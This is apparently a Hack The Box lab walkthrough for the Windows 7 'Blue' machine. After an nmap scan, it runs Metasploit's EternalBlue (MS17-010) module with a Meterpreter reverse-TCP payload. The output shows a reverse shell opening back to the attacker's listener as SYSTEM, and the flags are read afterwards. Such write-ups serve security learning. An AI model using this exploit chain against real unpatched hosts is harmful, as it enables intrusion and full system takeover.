---
title: "Hackthebox Blue Walkthrough"
description: "Hackthebox Blue Walkthrough"
date: 2026-02-20
categories: [Walkthrough]
tags: [hackthebox,Blue,Walkthrough,Windows]
image :
    path : https://lh3.googleusercontent.com/d/1cPgHDLst_2w2QFb36SsZn-BGIx50kzNH
---

<img src="https://lh3.googleusercontent.com/d/1L2SYRXwIQphzlpNRAO1Kc6pJGtrFLehl" alt=""><br>

- Blue is an Windows Easy Level Machine....

## <span style="color: DarkSalmon;"><b># Enumeration</b></span> 
-----

- Let's Start with nmap scan 

```bash
┌──(kali㉿kali)-[~/Desktop/Hackthebox/Labs/blue]
└─$ nmap -sC -sV -p- 10.129.23.137 --min-rate=5000 -oN blue.nmap
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 12:31 -0500
Nmap scan report for 10.129.23.137
Host is up (0.57s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 3s, median: 1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-13T17:33:32
|_  start_date: 2026-02-13T17:26:16
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-02-13T17:33:35+00:00
```

Total scanned TCP ports: 65535 
Closed: 65526
Open: 9

- How its gona be done `enumeration` → `Exploitation` → `Privilege Escalation`

- after a quick google search about `OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)` from nmap result i got to `exploit/windows/smb/ms17_010_eternalblue` metasploit module 

- then i quickly started metasploit `msfconsole` and then use the particular module , and setup all the required options for exploit to be successfull . 

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standar
d 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mac
hines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.80.154   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => 10.10.16.61
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.129.23.137
rhosts => 10.129.23.137
```

## <span style="color: DarkSalmon;"><b># Exploitation</b></span> 


- then i quickly run `check` command before exploiting , so quick check for exploitability ( doesn't make that much of difference but yaa i did either way) .. 

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > check
[*] 10.129.23.137:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.23.137:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.23.137:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.23.137:445 - The target is vulnerable.
```

- then i quickly run the `exploit` command and got the shell as `NT AUTHORITY\SYSTEM` 

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.10.16.61:4444 
[*] 10.129.23.137:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.23.137:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.23.137:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.23.137:445 - The target is vulnerable.
[*] 10.129.23.137:445 - Connecting to target for exploitation.
[+] 10.129.23.137:445 - Connection established for exploitation.
[+] 10.129.23.137:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.23.137:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.23.137:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.23.137:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.23.137:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.23.137:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.23.137:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.23.137:445 - Sending all but last fragment of exploit packet
[*] 10.129.23.137:445 - Starting non-paged pool grooming
[+] 10.129.23.137:445 - Sending SMBv2 buffers
[+] 10.129.23.137:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.23.137:445 - Sending final SMBv2 buffers.
[*] 10.129.23.137:445 - Sending last fragment of exploit packet!
[*] 10.129.23.137:445 - Receiving response from exploit packet
[+] 10.129.23.137:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.23.137:445 - Sending egg to corrupted connection.
[*] 10.129.23.137:445 - Triggering free of corrupted buffer.
[*] Sending stage (232006 bytes) to 10.129.23.137
[*] Meterpreter session 1 opened (10.10.16.61:4444 -> 10.129.23.137:49158) at 2026-02-13 12:34:35 -0500
[+] 10.129.23.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.23.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.23.137:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- so we basically got the highest privilege possible in windows (system) or call as `root` in linux .
- then we type `shell` command to drop native shell to interact with machine ... 

```bash
meterpreter > shell
Process 2088 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\users
cd C:\users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,427,256,832 bytes free

C:\Users>type haris\Desktop\user.txt
type haris\Desktop\user.txt
003f83e4ba5379e060d*******

C:\Users>type Administrator\Desktop\root.txt
type Administrator\Desktop\root.txt
ff2c3f357a56562ec1f*******
```

- and then we collect both `user` and `root` flag collectively ... nothing much for privilege escalation here ....


## <span style="color: DarkSalmon;"><b># Final Thoughts</b></span>
--------
I hope this blog continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts ; my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on Linkedin and Twitter <br>
[linkdin](https://www.linkedin.com/in/hitesh-sharma-413862245/) <br>
[Twitter](https://x.com/Archtrmntor)<br>